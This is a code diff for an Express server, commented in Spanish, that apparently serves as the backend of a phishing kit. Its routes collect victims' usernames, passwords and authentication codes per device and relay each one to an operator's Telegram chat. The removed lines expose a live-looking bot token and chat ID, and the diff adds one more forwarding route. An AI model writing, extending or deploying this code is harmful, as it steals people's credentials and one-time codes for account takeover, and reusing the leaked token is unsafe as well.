@@ -347,10 +347,10 @@ app.post('/send-user', async (req, res) => {
     }
     usuariosData[dispositivoID].usuario = `UUUUU ${dispositivoID.replace('id.', '')}: \`${usuario}\``;
 
-    await fetch(`https://api.telegram.org/bot8957452839:AAHVGv2F_wgM1Z03-VAOSpGdxTB8jhwrq3A/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
-            chat_id: '8660458713',
+            chat_id: OPCIONES_CHAT_ID,
             text: usuariosData[dispositivoID].usuario,
             parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
@@ -368,10 +368,10 @@ app.post('/send-password', async (req, res) => {
         usuariosData[dispositivoID].contraseña = `CCCCC ${dispositivoID.replace('id.', '')}: \`${password}\``;
     }
 
-    await fetch(`https://api.telegram.org/bot8957452839:AAHVGv2F_wgM1Z03-VAOSpGdxTB8jhwrq3A/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
-            chat_id: '8660458713',
+            chat_id: OPCIONES_CHAT_ID,
             text: usuariosData[dispositivoID].contraseña,
             parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
@@ -389,15 +389,38 @@ app.post('/send-auth', async (req, res) => {
         usuariosData[dispositivoID].codigo = `AAAAA ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
     }
 
-    await fetch(`https://api.telegram.org/bot8957452839:AAHVGv2F_wgM1Z03-VAOSpGdxTB8jhwrq3A/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
-            chat_id: '8660458713',
+            chat_id: OPCIONES_CHAT_ID,
             text: usuariosData[dispositivoID].codigo,
             parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
         headers: { 'Content-Type': 'application/json' },
     });
+    res.sendStatus(200);
+});
+
+// Ruta para recibir y enviar la calificación al bot de Telegram
+app.post('/send-calificacion', async (req, res) => {
+    const { dispositivoID, texto: calificacion } = req.body;
+
+    // Almacenar la calificación por dispositivo
+    if (usuariosData[dispositivoID]) {
+        usuariosData[dispositivoID].calificacion =
+            `⭐ CALIFICACIÓN ${dispositivoID.replace('id.', '')}: \`${calificacion}\``;
+    }
+
+    await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        body: JSON.stringify({
+            chat_id: OPCIONES_CHAT_ID,
+            text: usuariosData[dispositivoID].calificacion,
+            parse_mode: 'Markdown'
+        }),
+        headers: { 'Content-Type': 'application/json' },
+    });
+
     res.sendStatus(200);
 });
 
